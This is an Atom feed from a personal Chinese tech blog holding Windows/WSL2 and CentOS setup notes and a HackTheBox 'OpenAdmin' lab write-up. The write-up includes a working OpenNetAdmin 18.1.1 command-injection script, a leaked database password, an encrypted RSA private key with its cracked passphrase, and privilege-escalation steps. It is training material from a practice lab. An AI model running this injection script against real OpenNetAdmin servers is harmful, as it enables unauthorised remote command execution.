<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://leaf7th.github.io</id>
    <title>Nook&apos;s blog</title>
    <updated>2020-10-25T16:57:47.899Z</updated>
    <generator>https://github.com/jpmonette/feed</generator>
    <link rel="alternate" href="https://leaf7th.github.io"/>
    <link rel="self" href="https://leaf7th.github.io/atom.xml"/>
    <subtitle>One commit a day, keeps doctor away.</subtitle>
    <logo>https://leaf7th.github.io/images/avatar.png</logo>
    <icon>https://leaf7th.github.io/favicon.ico</icon>
    <rights>All rights reserved 2020, Nook&apos;s blog</rights>
    <entry>
        <title type="html"><![CDATA[Windows 折腾日记]]></title>
        <id>https://leaf7th.github.io/post/windows-zhe-teng-ri-ji/</id>
        <link href="https://leaf7th.github.io/post/windows-zhe-teng-ri-ji/">
        </link>
        <updated>2020-10-10T11:12:50.000Z</updated>
        <content type="html"><![CDATA[<h1 id="前言">前言</h1>
<p>Windows下很多问题折腾起来太费劲了，记录一下踩过的坑</p>
<h1 id="wsl2">WSL2</h1>
<p><a href="https://docs.microsoft.com/en-us/windows/wsl/install-win10">## Install the Windows Subsystem for Linux</a></p>
<h1 id="windows-terminal">Windows Terminal</h1>
<p>下载很简单，Windows store直接下载，接下来是配置</p>
<p><a href="https://docs.microsoft.com/en-us/windows/terminal/customize-settings/profile-settings">Profile settings in Windows Terminal</a></p>
<p><a href="https://atomcorp.github.io/themes/">可视化的 Windows Terminal 配色方案选择器</a></p>
<h1 id="ssh-key-bad-permission">SSH key bad permission</h1>
<p>Windows下也可以使用openssh来进行ssh连接，但是在使用private key的时候会碰到bad permission的问题。在Linux下这个问题非常容易解决，只需要 <code>chmod 600 keyname</code> 就好了，但是Windows的权限管理非常麻烦。</p>
<p>一个普遍的解决办法是：</p>
<p><code>右键点击Key→属性→安全→高级</code></p>
<p>然后将所有者更改为当前用户，禁用继承，删除所有权限并为当前账户添加权限</p>
<p>但是这个办法有一些小问题，当使用Microsoft用户登录Windows的时候，当前用户是<code>AzureAD\AccountName</code>，而这个用户是无法直接直接在Obeject Picker UI中选择的。</p>
<figure data-type="image" tabindex="1"><img src="https://leaf7th.github.io/post-images/1602257222602.jpg" alt="错误提示" loading="lazy"></figure>
<p>因此我们需要更换另一个办法来解决问题。</p>
<p>CLI方式：</p>
<pre><code class="language-powershell"># Set Variable
$key=&quot;C:\Path\to\keyfile&quot;

# Remove Inheritance
icacls ${key} /c /t /Inheritance:d

# Set Ownership to Owner
icacls ${key} /c /t /grant ${env:UserName}:F

# Remove All Users, except for Owner
icacls ${key} /c /t /Remove Administrator &quot;Authenticated Users&quot; BUILTIN\Administrators BUILTIN Everyone System Users

# Verify
icacls ${key}
</code></pre>
<p>这样就可以正确的设置private key权限了。</p>
<h1 id="配置ssh-tab">配置SSH Tab</h1>
<p>处理私钥权限问题，详见<a href="https://leaf7th.github.io/post/windows-zhe-teng-ri-ji/#ssh-key-bad-permission"> SSH key bad permission </a></p>
<p>在Windows Terminal的<code>setting.json</code>中添加</p>
<pre><code>{
    &quot;guid&quot;: &quot;{xxxx}&quot;,
    &quot;hidden&quot;: false,
    &quot;name&quot;: &quot;Tabname&quot;,
    &quot;colorScheme&quot;: &quot;WildCherry&quot;,
    &quot;commandline&quot; : &quot;ssh command&quot;
}
</code></pre>
<p>其中，commandline用于处填写ssh命令，guid使用<a href="https://www.guidgen.com/">Create GUIDs online</a>来生成。</p>
<h1 id="powershell">Powershell</h1>
<h2 id="powershell-7">Powershell 7</h2>
<p><a href="https://docs.microsoft.com/zh-cn/powershell/scripting/install/installing-powershell-core-on-windows?view=powershell-7">在 Windows 上安装 PowerShell</a></p>
<h2 id="powerline">Powerline</h2>
<p><a href="https://docs.microsoft.com/en-us/windows/terminal/tutorials/powerline-setup">Tutorial: Set up Powerline in Windows Terminal</a></p>
<p>字体同样设置给WSL2</p>
<h2 id="device-or-resource-busy">Device or resource busy</h2>
<p>如果使用Docker-desktop+WSL2来运行容器并挂载到WSL2目录，那么在删除容器后该目录会一直无法删除，提示Device or resource busy。</p>
<p>常用的方法是<code>lsof +D path</code>和<code>umount path</code>，无效</p>
<p>用<code>docker volume rm $(docker volume ls -qf dangling=true)</code>删除孤单卷，无效</p>
<p>在proc中的mountinfo可以看到忙碌目录挂载到了windows中，所以关闭Docker-desktop即可删除</p>
<h1 id="wsl2中的vim">WSL2中的Vim</h1>
<p>WT的自定义主题可以让shell看起来更漂亮，但是这会影响vim中语法高亮错误提示的效果。</p>
<p>一个简单的解决办法是，尝试一种能和当前Terminal主题适应的比较好的vim主题并微调</p>
<p>另一个解决办法是开启vim的真彩色。因为Terminal主题中更改的是0~15的颜色映射，如果终端支持真彩色，那么vim就可以使用16以上的颜色配置主题，从而避免了被终端主题所影响。</p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Centos 7 踩坑日记]]></title>
        <id>https://leaf7th.github.io/post/centos-7-cai-keng-ri-ji/</id>
        <link href="https://leaf7th.github.io/post/centos-7-cai-keng-ri-ji/">
        </link>
        <updated>2020-10-04T10:00:57.000Z</updated>
        <content type="html"><![CDATA[<h1 id="前言">前言</h1>
<p>在Oracle cloud上有台永久免费的服务器，当初部署的是centos 7，Oracle cloud有个缺点就是不能重装系统，只能放弃apt的便捷了。</p>
<h1 id="安装python38">安装Python3.8</h1>
<h2 id="踩坑命令">踩坑命令</h2>
<pre><code class="language-bash">sudo yum install gcc openssl-devel bzip2-devel libffi-devel
cd /opt
wget https://www.python.org/ftp/python/3.8.5/Python-3.8.5.tgz
tar xzf Python-3.8.5.tgz
cd Python-3.8.5
sudo ./configure --enable-optimizations
sudo make altinstall
</code></pre>
<h2 id="问题">问题</h2>
<p>编译的Python不完整，缺少sqlite，lzma等包</p>
<h2 id="正确步骤">正确步骤</h2>
<pre><code class="language-bash">sudo yum -y groupinstall &quot;Development tools&quot;
sudo yum -y install zlib-devel bzip2-devel openssl-devel ncurses-devel sudo sqlite-devel readline-devel tk-devel gdbm-devel db4-devel libpcap-devel xz-devel
sudo yum install -y libffi-devel zlib1g-dev
sudo yum install zlib* -y
cd /opt
wget https://www.python.org/ftp/python/3.8.5/Python-3.8.5.tgz
tar xzf Python-3.8.5.tgz
cd Python-3.8.5
sudo ./configure --enable-optimizations
sudo make altinstall
</code></pre>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Writeup-HackTheBox-OpenAdmin]]></title>
        <id>https://leaf7th.github.io/post/writeup-hackthebox-openadmin/</id>
        <link href="https://leaf7th.github.io/post/writeup-hackthebox-openadmin/">
        </link>
        <updated>2020-01-09T06:00:00.000Z</updated>
        <content type="html"><![CDATA[<p>感谢Richard推荐的这台Beginner machine，以及整个过程中的提示与帮助</p>
<h2 id="foothold">Foothold</h2>
<p>渗透HTB的Machine要先连接他们的VPN，一开始忘了这个浪费好多时间</p>
<p><code>openvpn Divinook.ovpn</code></p>
<p>拿到机器IP，首先做的是信息收集</p>
<pre><code>root@kali-nook:~# ping 10.10.10.171
PING 10.10.10.171 (10.10.10.171) 56(84) bytes of data.
64 bytes from 10.10.10.171: icmp_seq=1 ttl=63 time=618 ms
64 bytes from 10.10.10.171: icmp_seq=2 ttl=63 time=639 ms
64 bytes from 10.10.10.171: icmp_seq=3 ttl=63 time=281 ms
--- 10.10.10.171 ping statistics ---
10 packets transmitted, 9 received, 10% packet loss, time 9078ms
rtt min/avg/max/mdev = 281.126/445.225/754.480/168.189 ms

root@kali-nook:~# nmap -sV 10.10.10.171
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-18 22:08 EST
Nmap scan report for 10.10.10.171
Host is up (0.65s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/
Nmap done: 1 IP address (1 host up) scanned in 69.11 seconds
</code></pre>
<p>这里注意，如果Ping不通，可能是服务器开启了防火墙block了ICMP，可以用nmap的noping模式扫描</p>
<p><code>nmap -sV -Pn 10.10.10.171</code></p>
<p>两个端口开启，一般来说有80端口优先用80</p>
<p>访问10.10.10.171，没有什么有价值的信息，dirbuster爆破目录，扫到10.10.10.171/ona/</p>
<p>打开看一下，是webapp，OpenNetAdmin主页写明版本为18.1.1</p>
<p>Google一下这个版本的漏洞，发现有写好的script，注意这里虽然有人写好了metasploite模块，但是使用时会出现no session created的情况，还是直接用sh脚本吧</p>
<pre><code>#!/bin/bash

URL=&quot;${1}&quot;
while true;do
 echo -n &quot;$ &quot;; read cmd
 curl --silent -d &quot;xajax=window_submit&amp;xajaxr=1574117726710&amp;xajaxargs[]=tooltips&amp;xajaxargs[]=ip%3D%3E;echo \&quot;BEGIN\&quot;;${cmd};echo \&quot;END\&quot;&amp;xajaxargs[]=ping&quot; &quot;${URL}&quot; | sed -n -e '/BEGIN/,/END/ p' | tail -n +2 | head -n -1
done
</code></pre>
<p>这里的${1}含义是取第一个参数为变量赋值，所以可以用</p>
<p><code>bash ona.sh http://10.10.10.171/ona/</code></p>
<p>也可以直接将网址写入脚本来赋值</p>
<p>这里注意一点，windows下编辑的sh脚本在linux下运行会出错，所以可以用dos2unix来转码</p>
<p><code>dos2unix ona.sh</code></p>
<p>运行脚本，拿到第一个shell</p>
<pre><code>root@kali-nook:~# bash ona.sh
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
</code></pre>
<h2 id="user1">User1</h2>
<p>www-data的用户权限非常小，大部分命令无法使用，仅能用ls和cat来探索</p>
<p>在这里需要稍微思考一下怎么用仅有的权限来PE，通过查看OpenNetAdmin的安装代码（这是个开源项目）可以看到</p>
<p><code>$dbconffile = &quot;{$onabase}/www/local/config/database_settings.inc.php&quot;;</code></p>
<p>看一下能不能访问</p>
<p><code>cat local/config/database_settings.inc.php</code></p>
<pre><code>$ona_contexts=array (
  'DEFAULT' =&gt; 
  array (
    'databases' =&gt; 
    array (
      0 =&gt; 
      array (
        'db_type' =&gt; 'mysqli',
        'db_host' =&gt; 'localhost',
        'db_login' =&gt; 'ona_sys',
        'db_passwd' =&gt; 'n1nj4W4rri0R!',
        'db_database' =&gt; 'ona_default',
        'db_debug' =&gt; false,
      ),
    ),
    'description' =&gt; 'Default data context',
    'context_color' =&gt; '#D3DBFF',
  ),
);
</code></pre>
<p>OK，这里就拿到了SQL数据库的用户密码，但是这台机器并没有对外开启MySQL的端口，无法使用这个用户进行连接。</p>
<p>这里我经验不足，所以耽误了很久，感谢Richard的提醒，有可能会有Password reuse，看一下用户</p>
<p><code>cat /etc/group</code></p>
<p>internal组中有两个用户，jimmy和jonna</p>
<p>ssh连接jimmy成功</p>
<p><code>ssh jimmy@10.10.10.171</code></p>
<h2 id="user2">User2</h2>
<p>试一下常规提权</p>
<p><code>sudo -l</code></p>
<p>得到提示</p>
<p><code>Sorry, user jimmy may not run sudo on openadmin.</code></p>
<p>这里Richard提醒我可以尝试切换用户，继续寻找线索</p>
<p><code>find / -type f -user jimmy</code></p>
<p>寻找所有能被jimmy访问的文件，发现可以访问之前没有权限的/var/www，查看一下发现有一个internal文件夹</p>
<pre><code>jimmy@openadmin:/var/www/internal$ ls
index.php  logout.php  main.php
</code></pre>
<p>查看内容后发现这是内部访问的网页，同时main.php可以显示joanna登录的RSA私钥</p>
<pre><code>jimmy@openadmin:/var/www/internal$ cat main.php
&lt;?php session_start(); if (!isset ($_SESSION['username'])) { header(&quot;Location: /index.php&quot;); }; 
# Open Admin Trusted
# OpenAdmin
$output = shell_exec('cat /home/joanna/.ssh/id_rsa');
echo &quot;&lt;pre&gt;$output&lt;/pre&gt;&quot;;
?&gt;
&lt;html&gt;
&lt;h3&gt;Don't forget your &quot;ninja&quot; password&lt;/h3&gt;
Click here to logout &lt;a href=&quot;logout.php&quot; tite = &quot;Logout&quot;&gt;Session
&lt;/html&gt;
</code></pre>
<p>考虑到可能是管理者使用本机进行登录和内部管理，所以查看本机开放端口</p>
<p><code>netstat -ntlp</code></p>
<p>发现本地的3306和52846端口都处于listen状态，3306是数据库端口，试一下访问52846</p>
<p><code>curl 127.0.0.1:52846</code></p>
<p>得到了index.php的内容，所以直接</p>
<p><code>curl 127.0.0.1:52846/main.php</code></p>
<pre><code>&lt;pre&gt;-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,2AF25344B8391A25A9B318F3FD767D6D

kG0UYIcGyaxupjQqaS2e1HqbhwRLlNctW2HfJeaKUjWZH4usiD9AtTnIKVUOpZN8
ad/StMWJ+MkQ5MnAMJglQeUbRxcBP6++Hh251jMcg8ygYcx1UMD03ZjaRuwcf0YO
ShNbbx8Euvr2agjbF+ytimDyWhoJXU+UpTD58L+SIsZzal9U8f+Txhgq9K2KQHBE
6xaubNKhDJKs/6YJVEHtYyFbYSbtYt4lsoAyM8w+pTPVa3LRWnGykVR5g79b7lsJ
ZnEPK07fJk8JCdb0wPnLNy9LsyNxXRfV3tX4MRcjOXYZnG2Gv8KEIeIXzNiD5/Du
y8byJ/3I3/EsqHphIHgD3UfvHy9naXc/nLUup7s0+WAZ4AUx/MJnJV2nN8o69JyI
9z7V9E4q/aKCh/xpJmYLj7AmdVd4DlO0ByVdy0SJkRXFaAiSVNQJY8hRHzSS7+k4
piC96HnJU+Z8+1XbvzR93Wd3klRMO7EesIQ5KKNNU8PpT+0lv/dEVEppvIDE/8h/
/U1cPvX9Aci0EUys3naB6pVW8i/IY9B6Dx6W4JnnSUFsyhR63WNusk9QgvkiTikH
40ZNca5xHPij8hvUR2v5jGM/8bvr/7QtJFRCmMkYp7FMUB0sQ1NLhCjTTVAFN/AZ
fnWkJ5u+To0qzuPBWGpZsoZx5AbA4Xi00pqqekeLAli95mKKPecjUgpm+wsx8epb
9FtpP4aNR8LYlpKSDiiYzNiXEMQiJ9MSk9na10B5FFPsjr+yYEfMylPgogDpES80
X1VZ+N7S8ZP+7djB22vQ+/pUQap3PdXEpg3v6S4bfXkYKvFkcocqs8IivdK1+UFg
S33lgrCM4/ZjXYP2bpuE5v6dPq+hZvnmKkzcmT1C7YwK1XEyBan8flvIey/ur/4F
FnonsEl16TZvolSt9RH/19B7wfUHXXCyp9sG8iJGklZvteiJDG45A4eHhz8hxSzh
Th5w5guPynFv610HJ6wcNVz2MyJsmTyi8WuVxZs8wxrH9kEzXYD/GtPmcviGCexa
RTKYbgVn4WkJQYncyC0R1Gv3O8bEigX4SYKqIitMDnixjM6xU0URbnT1+8VdQH7Z
uhJVn1fzdRKZhWWlT+d+oqIiSrvd6nWhttoJrjrAQ7YWGAm2MBdGA/MxlYJ9FNDr
1kxuSODQNGtGnWZPieLvDkwotqZKzdOg7fimGRWiRv6yXo5ps3EJFuSU1fSCv2q2
XGdfc8ObLC7s3KZwkYjG82tjMZU+P5PifJh6N0PqpxUCxDqAfY+RzcTcM/SLhS79
yPzCZH8uWIrjaNaZmDSPC/z+bWWJKuu4Y1GCXCqkWvwuaGmYeEnXDOxGupUchkrM
+4R21WQ+eSaULd2PDzLClmYrplnpmbD7C7/ee6KDTl7JMdV25DM9a16JYOneRtMt
qlNgzj0Na4ZNMyRAHEl1SF8a72umGO2xLWebDoYf5VSSSZYtCNJdwt3lF7I8+adt
z0glMMmjR2L5c2HdlTUt5MgiY8+qkHlsL6M91c4diJoEXVh+8YpblAoogOHHBlQe
K1I1cqiDbVE/bmiERK+G4rqa0t7VQN6t2VWetWrGb+Ahw/iMKhpITWLWApA3k9EN
-----END RSA PRIVATE KEY-----
&lt;/pre&gt;&lt;html&gt;
&lt;h3&gt;Don't forget your &quot;ninja&quot; password&lt;/h3&gt;
Click here to logout &lt;a href=&quot;logout.php&quot; tite = &quot;Logout&quot;&gt;Session
&lt;/html&gt;
</code></pre>
<p>成功获得RSA私钥</p>
<p>尝试使用RSA私钥登录joanna</p>
<p><code>ssh -i rsa joanna@10.10.10.171</code></p>
<pre><code>Enter passphrase for key 'rsa': 
</code></pre>
<p>发现需要输入passphrase，尝试输入ninja，不对。考虑使用john破解</p>
<p><code>/usr/share/john/ssh2john.py rsa &gt; crack.txt</code><br>
<code>john --wordlist=/usr/share/wordlists/rockyou.txt crack.txt</code></p>
<p>成功破解，得到passphrase为bloodninjas，ssh登录成功</p>
<h2 id="root">Root</h2>
<p>常规提权</p>
<pre><code>sudo -l
sudo nano /opt/priv
</code></pre>
<p>GTFObins寻找命令</p>
<h2 id="conclusion">Conclusion</h2>
<p>任何网上找到的脚本，尽量读懂再用。</p>
<p>多看多想，涉及到开源app记得去读代码找漏洞。</p>
]]></content>
    </entry>
</feed>